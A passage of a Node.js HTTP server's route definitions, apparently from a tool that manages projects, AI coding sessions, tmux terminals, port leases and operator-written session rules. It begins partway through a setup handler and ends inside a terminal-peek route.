      'An admin username and password are required to finish setup while running behind the Caddy ingress (basic_auth login gate).',
      'ADMIN_REQUIRED');
  }
  if (inCaddyMode && adminProvided) {
    // The credential is stored but the live Caddyfile is only regenerated by the
    // cutover — surface that so the operator activates the gate at a terminal
    // (where rollback is available) rather than assuming they're already protected.
    warnings.push('Admin credential saved. Run `node scripts/ingress-cutover.js --to caddy` to regenerate the Caddyfile and activate the login gate.');
  }

  // Mark setup as complete
  config.setupComplete = true;
  store.config.save(config);

  // Attach selected projects
  const attached = [];
  if (Array.isArray(body.projects)) {
    for (const proj of body.projects) {
      if (!proj || !proj.name || !proj.path) continue;

      // Validate path exists and is a directory before registering
      if (!fs.existsSync(proj.path) || !fs.statSync(proj.path).isDirectory()) {
        warnings.push(`Skipped "${proj.name}": path does not exist or is not a directory`);
        continue;
      }

      // Skip if already registered — case-insensitive identity check (#221)
      // so the startup-sync doesn't silently double-register a case-collision.
      const existing = store.projects.getByNameCaseInsensitive(proj.name);
      if (existing) {
        const msg = existing.name === proj.name
          ? `Project "${proj.name}" already registered, skipped`
          : `Project "${proj.name}" already registered as "${existing.name}" (case-insensitive match), skipped`;
        warnings.push(msg);
        continue;
      }

      // Register in SQLite
      try {
        const engineId = config.defaultEngine || 'claude';
        const methodologyId = proj.methodology || config.defaultMethodology || 'minimal';

        store.projects.create({
          name: proj.name,
          path: proj.path,
          engine: engineId,
          methodology: methodologyId,
          tags: [],
          ports: {}
        });

        // Write per-project config if none exists
        const projConfigPath = path.join(proj.path, '.tangleclaw', 'project.json');
        if (!fs.existsSync(projConfigPath)) {
          const projConfig = JSON.parse(JSON.stringify(store.DEFAULT_PROJECT_CONFIG));
          projConfig.engine = engineId;
          projConfig.methodology = methodologyId;
          store.projectConfig.save(proj.path, projConfig);
        }

        attached.push(proj.name);
      } catch (err) {
        warnings.push(`Failed to attach "${proj.name}": ${err.message}`);
      }
    }
  }

  // Decide whether to schedule a restart so the server re-binds with the new protocol
  const prevWillServeHttps = !!(prevHttps.enabled && prevHttps.certPath && prevHttps.keyPath);
  const willServeHttps = !!(config.httpsEnabled && config.httpsCertPath && config.httpsKeyPath);
  const httpsChanged = prevHttps.enabled !== !!config.httpsEnabled
    || prevHttps.certPath !== (config.httpsCertPath || null)
    || prevHttps.keyPath !== (config.httpsKeyPath || null);
  const shouldRestart = httpsChanged && (willServeHttps || prevWillServeHttps);

  let redirectUrl = null;
  if (shouldRestart) {
    const hostHeader = (req.headers && req.headers.host) ? String(req.headers.host) : '';
    const hostname = hostHeader.split(':')[0] || 'localhost';
    const port = config.serverPort || 3101;
    const protocol = willServeHttps ? 'https' : 'http';
    redirectUrl = `${protocol}://${hostname}:${port}`;
    _scheduleRestart();
  }

  jsonResponse(res, 200, {
    ok: true,
    setupComplete: true,
    attached,
    warnings,
    restart: shouldRestart,
    redirectUrl
  });
});

// GET /api/rules/global
route('GET', '/api/rules/global', (_req, res) => {
  const content = store.globalRules.load();
  jsonResponse(res, 200, { content });
});

// PUT /api/rules/global
// #212 — bumped body cap to 256 KB. The default MAX_BODY_SIZE of 10 KB
// was below the size of the canonical bundled `data/global-rules.md`
// (14 KB and growing as new conventions land), so every PUT — whether
// from the landing-page editor or the API — was returning 413. 256 KB
// gives ~18x headroom over current size; even a 10x growth in the
// ruleset stays well under the limit. Other large-body routes use the
// same per-route override pattern — see `/api/audit/ingest` at the
// 512 KB cap (`server.js:2834`) and the upload route at 15 MB
// (`server.js:1574`).
route('PUT', '/api/rules/global', (_req, res, _params, body) => {
  if (typeof body.content !== 'string') {
    return errorResponse(res, 400, 'content (string) is required', 'BAD_REQUEST');
  }
  store.globalRules.save(body.content);
  jsonResponse(res, 200, { ok: true });
}, { maxBodySize: 256 * 1024 });

// POST /api/rules/global/reset
route('POST', '/api/rules/global/reset', (_req, res) => {
  const content = store.globalRules.reset();
  jsonResponse(res, 200, { content });
});

// ── Session Rules API (#347/D1a) ──
// Durable operator-authored behavioral directives injected cross-model at
// session launch. Persisting a rule does NOT force a config regen — configs
// pick it up on next session launch / syncAllProjects, identical to how
// global-rules edits propagate today. The D1a UI authors GLOBAL rules
// (projectId omitted); the nullable project_id is schema-ready for D1b.

// GET /api/session-rules — list (optional ?projectId= / ?scope=global / ?kind=)
route('GET', '/api/session-rules', (req, res) => {
  const urlObj = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
  const query = parseQuery(urlObj.search);
  const options = {};
  if (query.scope === 'global') options.scope = 'global';
  else if (query.projectId !== undefined) options.projectId = Number(query.projectId);
  // CC-6 (#381): filter the per-project modal's three boxes by rule kind.
  if (query.kind !== undefined) options.kind = query.kind;
  const rules = store.sessionRules.list(options);
  jsonResponse(res, 200, { rules });
});

// POST /api/session-rules — create { content, projectId?, createdBy?, kind? }
route('POST', '/api/session-rules', (_req, res, _params, body) => {
  if (!body || typeof body.content !== 'string' || !body.content.trim()) {
    return errorResponse(res, 400, 'content (non-empty string) is required', 'BAD_REQUEST');
  }
  try {
    const rule = store.sessionRules.create({
      content: body.content,
      projectId: body.projectId ?? null,
      createdBy: body.createdBy || 'operator',
      // CC-6 (#381): 'startup' (default) | 'wrap' | 'mode'. Invalid → store throws BAD_REQUEST.
      kind: body.kind
    });
    jsonResponse(res, 201, rule);
  } catch (err) {
    if (err.code === 'BAD_REQUEST') {
      return errorResponse(res, 400, err.message, 'BAD_REQUEST');
    }
    throw err;
  }
}, { maxBodySize: 256 * 1024 });

// PUT /api/session-rules/:id — update { content?, enabled? }
route('PUT', '/api/session-rules/:id', (_req, res, params, body) => {
  if (!body || typeof body !== 'object') {
    return errorResponse(res, 400, 'Request body must be a JSON object', 'BAD_REQUEST');
  }
  try {
    const rule = store.sessionRules.update(Number(params.id), body);
    jsonResponse(res, 200, rule);
  } catch (err) {
    if (err.code === 'NOT_FOUND') {
      return errorResponse(res, 404, err.message, 'NOT_FOUND');
    }
    if (err.code === 'BAD_REQUEST') {
      return errorResponse(res, 400, err.message, 'BAD_REQUEST');
    }
    throw err;
  }
}, { maxBodySize: 256 * 1024 });

// DELETE /api/session-rules/:id
route('DELETE', '/api/session-rules/:id', (_req, res, params) => {
  try {
    store.sessionRules.delete(Number(params.id));
    jsonResponse(res, 200, { ok: true, id: Number(params.id) });
  } catch (err) {
    if (err.code === 'NOT_FOUND') {
      return errorResponse(res, 404, err.message, 'NOT_FOUND');
    }
    throw err;
  }
});

// ── Session Rules self-improvement (D1b) ──
// Versioning + rollback, learnings→rule promotion, and the non-authoritative
// conflict-candidate signal. The Critic-gate for conflicting/autonomous edits is
// an IN-SESSION agent capability (the server cannot summon a Critic) — see
// `docs/session-rules-self-improvement.md`.

// POST /api/session-rules/promote — promote a learning into a rule (operator-confirmed)
route('POST', '/api/session-rules/promote', (_req, res, _params, body) => {
  if (!body || body.learningId === undefined) {
    return errorResponse(res, 400, 'learningId is required', 'BAD_REQUEST');
  }
  try {
    const rule = store.sessionRules.promoteFromLearning(Number(body.learningId), {
      content: body.content,
      projectId: body.projectId ?? null,
      createdBy: body.createdBy,
      // CC-6 (#381): the wrap-time self-critique loop promotes a learning into a 'wrap' rule.
      kind: body.kind
    });
    jsonResponse(res, 201, rule);
  } catch (err) {
    if (err.code === 'NOT_FOUND') return errorResponse(res, 404, err.message, 'NOT_FOUND');
    if (err.code === 'BAD_REQUEST') return errorResponse(res, 400, err.message, 'BAD_REQUEST');
    throw err;
  }
}, { maxBodySize: 256 * 1024 });

// POST /api/session-rules/conflicts — non-authoritative conflict-candidate signal
route('POST', '/api/session-rules/conflicts', (_req, res, _params, body) => {
  if (!body || typeof body.content !== 'string' || !body.content.trim()) {
    return errorResponse(res, 400, 'content (non-empty string) is required', 'BAD_REQUEST');
  }
  const candidates = store.sessionRules.findConflictCandidates(body.content, body.projectId ?? null, { kind: body.kind });
  jsonResponse(res, 200, { candidates });
}, { maxBodySize: 256 * 1024 });

// GET /api/session-rules/:id/versions — version history (newest first)
route('GET', '/api/session-rules/:id/versions', (_req, res, params) => {
  const rule = store.sessionRules.get(Number(params.id));
  if (!rule) return errorResponse(res, 404, `Session rule ${params.id} not found`, 'NOT_FOUND');
  const versions = store.sessionRules.listVersions(Number(params.id));
  jsonResponse(res, 200, { versions });
});

// POST /api/session-rules/:id/restore — roll back to a prior version
route('POST', '/api/session-rules/:id/restore', (_req, res, params, body) => {
  if (!body || body.versionNo === undefined) {
    return errorResponse(res, 400, 'versionNo is required', 'BAD_REQUEST');
  }
  try {
    const rule = store.sessionRules.restore(Number(params.id), Number(body.versionNo), { changedBy: body.changedBy });
    jsonResponse(res, 200, rule);
  } catch (err) {
    if (err.code === 'NOT_FOUND') return errorResponse(res, 404, err.message, 'NOT_FOUND');
    throw err;
  }
});

// GET /api/system
route('GET', '/api/system', (_req, res) => {
  const stats = system.getStats();
  jsonResponse(res, 200, stats);
});

// GET /api/engines
route('GET', '/api/engines', (_req, res) => {
  const list = engines.listWithAvailability();
  jsonResponse(res, 200, { engines: list });
});

// GET /api/engines/:id
route('GET', '/api/engines/:id', (_req, res, params) => {
  const profile = engines.getWithAvailability(params.id);
  if (!profile) {
    return errorResponse(res, 404, `Engine "${params.id}" not found`, 'NOT_FOUND');
  }
  jsonResponse(res, 200, profile);
});

// GET /api/models/status — Upstream service status for all engines
route('GET', '/api/models/status', (_req, res) => {
  jsonResponse(res, 200, { status: modelStatus.getStatus() });
});

// GET /api/update-status — Cached update check result
route('GET', '/api/update-status', (_req, res) => {
  jsonResponse(res, 200, updateChecker.getCachedStatus());
});

// POST /api/update/apply — the self-update ACTION (#228/#229, UB). Fetches +
// checks out the latest release tag; does NOT restart. The client chains
// POST /api/server/restart on a 200. A refused safety guard (dirty tree, no
// update, wrong ref, not a git checkout) returns 409 with a stable `code`; an
// unexpected git failure mid-flow returns 500 with the pre-update `fromSha` so
// recovery is a one-line manual `git checkout <fromSha>`.
route('POST', '/api/update/apply', (_req, res) => {
  const result = updateApplier.applyUpdate();
  if (result.ok) {
    jsonResponse(res, 200, result);
    return;
  }
  jsonResponse(res, result.code === 'git-error' ? 500 : 409, result);
});

// POST /api/tmux/mouse
route('POST', '/api/tmux/mouse', (_req, res, _params, body) => {
  if (!body || typeof body.session !== 'string') {
    return errorResponse(res, 400, 'session is required', 'BAD_REQUEST');
  }
  if (typeof body.on !== 'boolean') {
    return errorResponse(res, 400, 'on must be a boolean', 'BAD_REQUEST');
  }

  try {
    const tmuxName = tmux.toSessionName(body.session);
    tmux.setMouse(tmuxName, body.on, { hooks: !!body.hooks });
    jsonResponse(res, 200, { mouse: body.on, session: body.session });
  } catch (err) {
    return errorResponse(res, 404, err.message, 'NOT_FOUND');
  }
});

// GET /api/ports — List all port leases (optional ?host= filter)
route('GET', '/api/ports', (req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const hostFilter = url.searchParams.get('host') || undefined;
  const leases = porthub.getLeases(hostFilter ? { host: hostFilter } : undefined);
  const grouped = {};
  for (const lease of leases) {
    const key = lease.host === 'localhost' ? lease.project : `${lease.host}/${lease.project}`;
    if (!grouped[key]) grouped[key] = [];
    grouped[key].push(lease);
  }

  // Count system-detected ports not tracked in lease DB (localhost only)
  const systemPorts = portScanner.getSystemPorts();
  const leasedPortSet = new Set(leases.filter(l => l.host === 'localhost').map(l => l.port));
  const systemPortCount = systemPorts.filter(sp => !leasedPortSet.has(sp.port)).length;

  jsonResponse(res, 200, {
    totalLeases: leases.length,
    systemPortCount,
    leases,
    grouped
  });
});

// POST /api/ports/lease — Create or renew a lease
route('POST', '/api/ports/lease', (_req, res, _params, body) => {
  if (!body || !body.port || !body.project || !body.service) {
    return errorResponse(res, 400, 'port, project, and service are required', 'BAD_REQUEST');
  }
  try {
    const lease = store.portLeases.lease({
      host: body.host || 'localhost',
      port: body.port,
      project: body.project,
      service: body.service,
      permanent: body.permanent || false,
      ttlMs: body.ttl || null,
      description: body.description || null,
      autoRenew: body.autoRenew || false
    });
    jsonResponse(res, 201, lease);
  } catch (err) {
    return errorResponse(res, 400, err.message, 'BAD_REQUEST');
  }
});

// POST /api/ports/sync — Sync leases from old PortHub daemon
route('POST', '/api/ports/sync', (_req, res) => {
  const result = porthub.syncFromDaemon();
  jsonResponse(res, 200, { ok: true, imported: result.imported });
});

// POST /api/ports/release — Release a lease
route('POST', '/api/ports/release', (_req, res, _params, body) => {
  if (!body || !body.port) {
    return errorResponse(res, 400, 'port is required', 'BAD_REQUEST');
  }
  store.portLeases.release(body.port, body.host || 'localhost');
  jsonResponse(res, 200, { ok: true, host: body.host || 'localhost', port: body.port });
});

// POST /api/ports/heartbeat — Heartbeat a lease
route('POST', '/api/ports/heartbeat', (_req, res, _params, body) => {
  if (!body || !body.port) {
    return errorResponse(res, 400, 'port is required', 'BAD_REQUEST');
  }
  const lease = store.portLeases.heartbeat(body.port, body.host || 'localhost');
  if (!lease) {
    return errorResponse(res, 404, `No lease found for port ${body.port}`, 'NOT_FOUND');
  }
  jsonResponse(res, 200, lease);
});

// GET /api/projects
route('GET', '/api/projects', (req, res) => {
  const urlObj = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
  const query = parseQuery(urlObj.search);
  const options = {};
  if (query.archived === 'true') options.archived = true;
  if (query.tag) options.tag = query.tag;
  if (query.methodology) options.methodology = query.methodology;
  if (query.engine) options.engine = query.engine;

  const list = projects.listAllProjects(options);
  jsonResponse(res, 200, { projects: list });
});

// POST /api/projects/attach — Attach an existing filesystem directory as a project
route('POST', '/api/projects/attach', (_req, res, _params, body) => {
  if (!body || !body.name) {
    return errorResponse(res, 400, 'name is required', 'BAD_REQUEST');
  }

  const result = projects.attachProject(body.name);
  if (!result.project) {
    const firstError = result.errors[0] || 'Attach failed';
    const code = firstError.includes('already registered') ? 'CONFLICT' : 'BAD_REQUEST';
    return errorResponse(res, code === 'CONFLICT' ? 409 : 400, firstError, code);
  }

  const response = {
    id: result.project.id,
    name: result.project.name,
    path: result.project.path,
    engine: result.project.engine,
    methodology: result.project.methodology,
    tags: result.project.tags,
    registered: true,
    createdAt: result.project.createdAt
  };

  if (result.errors.length > 0) {
    response.warnings = result.errors;
  }

  jsonResponse(res, 201, response);
});

// GET /api/projects/orphan-hooks-scan — Read-only inventory of projects with
// orphan hook entries in .claude/settings.json (#145, chunk 2). MUST be
// registered before GET /api/projects/:name so the literal path wins.
route('GET', '/api/projects/orphan-hooks-scan', (_req, res) => {
  const result = projects.scanForOrphanHooks();
  jsonResponse(res, 200, result);
});

// POST /api/projects/repair-orphan-hooks — Strip orphan hook entries from
// affected projects. Body: `{ project?: string }` for single-target. Returns
// `{ repaired, skipped, errors }` (#145, chunk 2).
route('POST', '/api/projects/repair-orphan-hooks', (_req, res, _params, body) => {
  if (body && body.project !== undefined && typeof body.project !== 'string') {
    return errorResponse(res, 400, 'project must be a string', 'BAD_REQUEST');
  }
  const projectName = body && body.project ? body.project : null;
  const result = projects.repairOrphanHooks(projectName);
  if (projectName && result.errors.some((e) => e.error === 'Project not found')) {
    return errorResponse(res, 404, `Project "${projectName}" not found`, 'NOT_FOUND');
  }
  jsonResponse(res, 200, result);
});

// GET /api/projects/:name
route('GET', '/api/projects/:name', (_req, res, params) => {
  const project = projects.getProject(params.name);
  if (!project) {
    return errorResponse(res, 404, `Project "${params.name}" not found`, 'NOT_FOUND');
  }
  jsonResponse(res, 200, project);
});

// POST /api/projects
route('POST', '/api/projects', (_req, res, _params, body) => {
  if (!body || !body.name) {
    return errorResponse(res, 400, 'name is required', 'BAD_REQUEST');
  }

  const result = projects.createProject(body);
  if (!result.project) {
    const code = result.errors[0] && result.errors[0].includes('already exists') ? 'CONFLICT' : 'BAD_REQUEST';
    return errorResponse(res, code === 'CONFLICT' ? 409 : 400, result.errors[0], code);
  }

  const response = {
    id: result.project.id,
    name: result.project.name,
    path: result.project.path,
    engine: result.project.engineId,
    methodology: result.project.methodology,
    tags: result.project.tags,
    ports: result.project.ports,
    createdAt: result.project.createdAt
  };

  if (result.errors.length > 0) {
    response.warnings = result.errors;
  }

  jsonResponse(res, 201, response);
});

// POST /api/projects/import — Register existing project directories
route('POST', '/api/projects/import', (_req, res, _params, body) => {
  if (!body || !Array.isArray(body.names) || body.names.length === 0) {
    return errorResponse(res, 400, 'names array is required', 'BAD_REQUEST');
  }

  const config = store.config.load();
  const projectsDir = projects.resolveProjectsDir(config.projectsDir);
  const imported = [];
  const warnings = [];

  for (const name of body.names) {
    // Case-insensitive identity (#221) — symmetric with createProject /
    // attachProject so import can't introduce a case-collision the other
    // paths would reject.
    const existing = store.projects.getByNameCaseInsensitive(name);
    if (existing) {
      const msg = existing.name === name
        ? `"${name}" already registered`
        : `"${name}" already registered as "${existing.name}" (case-insensitive match)`;
      warnings.push(msg);
      continue;
    }

    const projPath = path.join(projectsDir, name);
    if (!fs.existsSync(projPath) || !fs.statSync(projPath).isDirectory()) {
      // Release orphan port leases — the project can never be imported
      const released = store.portLeases.releaseByProject(name);
      if (released > 0) {
        warnings.push(`"${name}" directory not found — released ${released} orphan port lease${released > 1 ? 's' : ''}`);
      } else {
        warnings.push(`"${name}" directory not found in ${projectsDir}`);
      }
      continue;
    }

    const detectedMethodology = methodologies.detect(projPath);
    const engineId = config.defaultEngine || 'claude';
    // Every project has a methodology — minimal is the no-workflow option (#151)
    const methodologyId = detectedMethodology ? detectedMethodology.id : (config.defaultMethodology || 'minimal');

    try {
      store.projects.create({
        name,
        path: projPath,
        engine: engineId,
        methodology: methodologyId,
        tags: [],
        ports: {}
      });

      // Write per-project config if none exists
      const projConfigPath = path.join(projPath, '.tangleclaw', 'project.json');
      if (!fs.existsSync(projConfigPath)) {
        const projConfig = JSON.parse(JSON.stringify(store.DEFAULT_PROJECT_CONFIG));
        projConfig.engine = engineId;
        projConfig.methodology = methodologyId;
        store.projectConfig.save(projPath, projConfig);
      }

      imported.push(name);
    } catch (err) {
      warnings.push(`Failed to import "${name}": ${err.message}`);
    }
  }

  jsonResponse(res, 200, { imported, warnings });
});

// DELETE /api/projects/:name
route('DELETE', '/api/projects/:name', (_req, res, params, body) => {
  const passwordCheck = projects.checkDeletePassword(body ? body.password : undefined);
  if (!passwordCheck.allowed) {
    return errorResponse(res, 403, passwordCheck.error, 'FORBIDDEN');
  }

  const project = projects.getProject(params.name);
  if (!project) {
    return errorResponse(res, 404, `Project "${params.name}" not found`, 'NOT_FOUND');
  }

  const deleteFiles = body && body.deleteFiles === true;
  const result = projects.deleteProject(params.name, { deleteFiles });

  if (!result.success) {
    return errorResponse(res, 500, result.errors[0] || 'Delete failed', 'INTERNAL_ERROR');
  }

  jsonResponse(res, 200, {
    ok: true,
    name: params.name,
    filesDeleted: result.filesDeleted
  });
});

// POST /api/projects/:name/archive — Archive (deactivate) a project
route('POST', '/api/projects/:name/archive', (_req, res, params) => {
  const result = projects.archiveProject(params.name);
  if (!result.success) {
    const firstError = result.errors[0];
    const status = firstError.includes('not found') ? 404 : 400;
    return errorResponse(res, status, firstError, firstError.includes('not found') ? 'NOT_FOUND' : 'BAD_REQUEST');
  }
  jsonResponse(res, 200, { ok: true, name: params.name });
});

// POST /api/projects/:name/unarchive — Restore an archived project
route('POST', '/api/projects/:name/unarchive', (_req, res, params) => {
  const result = projects.unarchiveProject(params.name);
  if (!result.success) {
    const firstError = result.errors[0];
    const status = firstError.includes('not found') ? 404 : 400;
    return errorResponse(res, status, firstError, firstError.includes('not found') ? 'NOT_FOUND' : 'BAD_REQUEST');
  }
  jsonResponse(res, 200, { ok: true, name: params.name });
});

// POST /api/projects/:name/migrate-to-plugin — Migrate a project to V2-plugin
// governance (#262, C1). Cohort-aware (non-Claude → not-applicable) + session-safe
// (defers on a live session; never auto-closes). Idempotent.
route('POST', '/api/projects/:name/migrate-to-plugin', (_req, res, params) => {
  const result = projects.migrateProjectToPlugin(params.name);
  if (result.error) {
    const notFound = result.error.includes('not found');
    return errorResponse(res, notFound ? 404 : 400, result.error, notFound ? 'NOT_FOUND' : 'BAD_REQUEST');
  }
  jsonResponse(res, 200, {
    ok: true,
    name: params.name,
    migrationStatus: result.status,
    migrated: result.migrated,
    deferred: result.deferred || false,
    alreadyGoverned: result.alreadyGoverned || false,
    reason: result.reason
  });
});

// PATCH /api/projects/:name
route('PATCH', '/api/projects/:name', (_req, res, params, body) => {
  if (!body || typeof body !== 'object') {
    return errorResponse(res, 400, 'Request body must be a JSON object', 'BAD_REQUEST');
  }

  const result = projects.updateProject(params.name, body);

  if (result.errors.length > 0 && !result.project) {
    const firstError = result.errors[0];
    if (firstError.includes('not found')) {
      return errorResponse(res, 404, firstError, 'NOT_FOUND');
    }
    if (firstError.includes('Core rules')) {
      return errorResponse(res, 400, firstError, 'BAD_REQUEST');
    }
    return errorResponse(res, 400, firstError, 'BAD_REQUEST');
  }

  const response = {
    id: result.project.id,
    name: result.project.name,
    engine: result.project.engine.id,
    methodology: result.project.methodology.id,
    tags: result.project.tags,
    silentPrime: result.project.silentPrime,
    updatedAt: result.project.updatedAt
  };

  if (result.methodologySwitch) {
    response.methodologySwitch = result.methodologySwitch;
  }

  if (result.errors.length > 0) {
    response.warnings = result.errors;
  }

  jsonResponse(res, 200, response);
});

// GET /api/methodologies
route('GET', '/api/methodologies', (_req, res) => {
  const list = methodologies.listTemplates();
  jsonResponse(res, 200, { methodologies: list });
});

// GET /api/methodologies/:id
route('GET', '/api/methodologies/:id', (_req, res, params) => {
  const template = methodologies.getTemplate(params.id);
  if (!template) {
    return errorResponse(res, 404, `Methodology "${params.id}" not found`, 'NOT_FOUND');
  }
  jsonResponse(res, 200, template);
});

// POST /api/projects/:name/actions/:command — Run a methodology-declared action
// (#139 Chunk 11b). Body is the handler's `options` (forwarded verbatim;
// undefined when absent). Returns the handler's `{ok, output, error}` result.
// Status codes: 200 ok or handler-soft-fail; 404 project / unknown command;
// 500 handler thrown.
route('POST', '/api/projects/:name/actions/:command', async (_req, res, params, body) => {
  const options = body && typeof body === 'object' && !Array.isArray(body) ? body : undefined;
  const result = await actions.runAction(params.name, params.command, options);

  if (!result.ok) {
    if (result.error && result.error.includes('not found')) {
      return errorResponse(res, 404, result.error, 'NOT_FOUND');
    }
    if (result.error && result.error.includes('does not declare action')) {
      return errorResponse(res, 404, result.error, 'NOT_FOUND');
    }
    if (result.error && result.error.includes('threw')) {
      return errorResponse(res, 500, result.error, 'INTERNAL_ERROR');
    }
    // Soft fail (e.g. detached HEAD, missing project.path, fs error) —
    // return 200 with `ok:false` so the frontend can surface the
    // handler's specific error message inline.
    return jsonResponse(res, 200, result);
  }

  jsonResponse(res, 200, result);
});

// POST /api/sessions/:project — Launch session
route('POST', '/api/sessions/:project', (_req, res, params, body) => {
  const project = projects.getProject(params.project);
  if (!project) {
    return errorResponse(res, 404, `Project "${params.project}" not found`, 'NOT_FOUND');
  }

  // AUTH-3: stamp the session with the proxy-authenticated user (null in direct
  // mode / when the gate is off — resolveRequestUser enforces the trust gate).
  const owner = authIdentity.resolveRequestUser(_req.headers, store.config.load());

  const result = sessions.launchSession(params.project, {
    primePrompt: body ? body.primePrompt : true,
    engineOverride: body ? body.engineOverride : null,
    mode: body ? body.mode : undefined,
    launchMode: body ? body.launchMode : undefined,
    owner
  });

  // Web UI mode — delegate to async launch path
  if (result.webui) {
    const launchOpts = {
      force: body ? body.force === true : false,
      // #210 Phase 2 — forward the launch-mode picker choice through to
      // launchWebuiSession so it can pre-create a ClawBridge session
      // with the matching permissionMode (resolved against the engine
      // profile's bridgePermissionMode mapping).
      launchMode: body ? body.launchMode : null,
      owner  // AUTH-3: stamp the webui session with the authenticated user too
    };
    sessions.launchWebuiSession(params.project, result._conn, result._engineId, result._engineProfile, result._project, launchOpts)
      .then((webuiResult) => {
        if (webuiResult.error) {
          const status = webuiResult.staleTunnel ? 409 : 500;
          const code = webuiResult.staleTunnel ? 'TUNNEL_CONFLICT' : 'INTERNAL_ERROR';
          const payload = { error: webuiResult.error, code };
          if (webuiResult.staleTunnel) payload.staleTunnel = webuiResult.staleTunnel;
          res.writeHead(status, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify(payload));
          return;
        }
        jsonResponse(res, 201, {
          sessionId: webuiResult.session.id,
          project: params.project,
          engine: webuiResult.session.engineId,
          sessionMode: 'webui',
          tmuxSession: null,
          primePrompt: null,
          startedAt: webuiResult.session.startedAt,
          iframeUrl: webuiResult.iframeUrl,
          ttydUrl: null
        });
      })
      .catch((err) => {
        errorResponse(res, 500, `Web UI launch failed: ${err.message}`, 'INTERNAL_ERROR');
      });
    return;
  }

  if (result.error) {
    if (result.error.includes('already active')) {
      return errorResponse(res, 409, result.error, 'CONFLICT');
    }
    if (result.error.includes('not available')) {
      return errorResponse(res, 400, result.error, 'BAD_REQUEST');
    }
    return errorResponse(res, 500, result.error, 'INTERNAL_ERROR');
  }

  jsonResponse(res, 201, {
    sessionId: result.session.id,
    project: params.project,
    engine: result.session.engineId,
    sessionMode: result.session.sessionMode || 'tmux',
    launchMode: result.session.launchMode || null,
    tmuxSession: result.session.tmuxSession,
    primePrompt: result.primePrompt,
    startedAt: result.session.startedAt,
    iframeUrl: null,
    ttydUrl: result.ttydUrl
  });
});

// DELETE /api/sessions/:project — Kill session
route('DELETE', '/api/sessions/:project', (_req, res, params, body) => {
  const passwordCheck = projects.checkDeletePassword(body ? body.password : undefined);
  if (!passwordCheck.allowed) {
    return errorResponse(res, 403, passwordCheck.error, 'FORBIDDEN');
  }

  const result = sessions.killSession(params.project, body ? body.reason : undefined);
  if (result.error) {
    if (result.error.includes('not found') || result.error.includes('No active')) {
      return errorResponse(res, 404, result.error, 'NOT_FOUND');
    }
    return errorResponse(res, 500, result.error, 'INTERNAL_ERROR');
  }

  // Orphan tmux reconciliation — DB had no session row but tmux had one (#105).
  if (result.reconciled) {
    return jsonResponse(res, 200, {
      ok: true,
      project: params.project,
      reconciled: true
    });
  }

  jsonResponse(res, 200, {
    ok: true,
    sessionId: result.session.id,
    project: params.project,
    durationSeconds: result.session.durationSeconds,
    status: result.session.status
  });
});

// GET /api/sessions/:project/status — Session status + idle detection
route('GET', '/api/sessions/:project/status', (_req, res, params) => {
  const status = sessions.getSessionStatus(params.project);
  if (!status) {
    return errorResponse(res, 404, `Project "${params.project}" not found`, 'NOT_FOUND');
  }
  // CC-7 Slice C — surface a pending typed-wrap request so the session view's
  // status poll can open the wrap drawer (trigger parity with the Wrap button).
  status.wrapRequested = wrapSentinel.isWrapRequested(params.project);
  jsonResponse(res, 200, status);
});

// POST /api/sessions/:project/wrap-sentinel/ack — Clear a pending typed-wrap
// request once the session view has opened the wrap drawer, so the poll won't
// reopen it (CC-7 Slice C). Idempotent: acking with nothing pending is a no-op.
route('POST', '/api/sessions/:project/wrap-sentinel/ack', (_req, res, params) => {
  const cleared = wrapSentinel.ackWrapRequest(params.project);
  jsonResponse(res, 200, { ok: true, project: params.project, cleared });
});

// POST /api/sessions/:project/command — Inject command
route('POST', '/api/sessions/:project/command', (_req, res, params, body) => {
  if (!body || !body.command) {
    return errorResponse(res, 400, 'command is required', 'BAD_REQUEST');
  }
  if (body.command.length > 4096) {
    return errorResponse(res, 400, 'Command exceeds maximum length of 4096 characters', 'BAD_REQUEST');
  }

  const result = sessions.injectCommand(params.project, body.command, {
    enter: body.enter !== false
  });

  if (!result.ok) {
    if (result.error.includes('not found') || result.error.includes('No active')) {
      return errorResponse(res, 404, result.error, 'NOT_FOUND');
    }
    return errorResponse(res, 500, result.error, 'INTERNAL_ERROR');
  }

  jsonResponse(res, 200, {
    ok: true,
    project: params.project,
    command: body.command
  });
});

// POST /api/sessions/:project/wrap — Trigger wrap skill
// Body: { password?, options? } — `options` is V2-only and carries per-wrap
// user choices the drawer collected on retry after a blocked step
// (`{skipTests, criticSkipRationale, prHandling}`). Legacy V1 path ignores it.
route('POST', '/api/sessions/:project/wrap', async (_req, res, params, body) => {
  const passwordCheck = projects.checkDeletePassword(body ? body.password : undefined);
  if (!passwordCheck.allowed) {
    return errorResponse(res, 403, passwordCheck.error, 'FORBIDDEN');
  }

  const options = body && typeof body.options === 'object' && body.options !== null ? body.options : undefined;
  const result = await sessions.triggerWrap(params.project, options);
  // V2 may return ok:false from the pipeline (a blocked step). That's not a
  // server error — it's an expected pipeline outcome the drawer renders.
  // Surface it with HTTP 200 + `pipelineResult` so the frontend can paint
  // per-step status and collect retry inputs.
  if (!result.ok && !result.pipelineResult) {
    if (result.error && (result.error.includes('not found') || result.error.includes('No active'))) {
      return errorResponse(res, 404, result.error, 'NOT_FOUND');
    }
    return errorResponse(res, 500, result.error || 'Wrap failed', 'INTERNAL_ERROR');
  }

  const payload = {
    ok: result.ok,
    sessionId: result.sessionId,
    project: params.project,
    status: result.ok ? 'wrapping' : 'blocked',
    wrapCommand: result.wrapCommand,
    wrapSteps: result.wrapSteps,
    captureFields: result.captureFields
  };
  if (result.pipelineResult) payload.pipelineResult = result.pipelineResult;
  if (!result.ok && result.error) payload.error = result.error;
  jsonResponse(res, 200, payload);
});

// POST /api/sessions/:project/wrap/complete — Manual wrap completion
route('POST', '/api/sessions/:project/wrap/complete', (_req, res, params, body) => {
  const result = sessions.completeWrap(params.project, body ? body.summary : undefined);
  if (result.error) {
    if (result.error.includes('not found') || result.error.includes('No active')) {
      return errorResponse(res, 404, result.error, 'NOT_FOUND');
    }
    return errorResponse(res, 500, result.error, 'INTERNAL_ERROR');
  }

  jsonResponse(res, 200, {
    ok: true,
    session: result.session
  });
});

// GET /api/sessions/:project/peek — Peek at terminal output
route('GET', '/api/sessions/:project/peek', (req, res, params) => {
  const urlObj = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
  const query = parseQuery(urlObj.search);
  const full = query.full === 'true';
  const lines = query.lines ? parseInt(query.lines, 10) : 5;

  const result = sessions.peek(params.project, { lines, full });
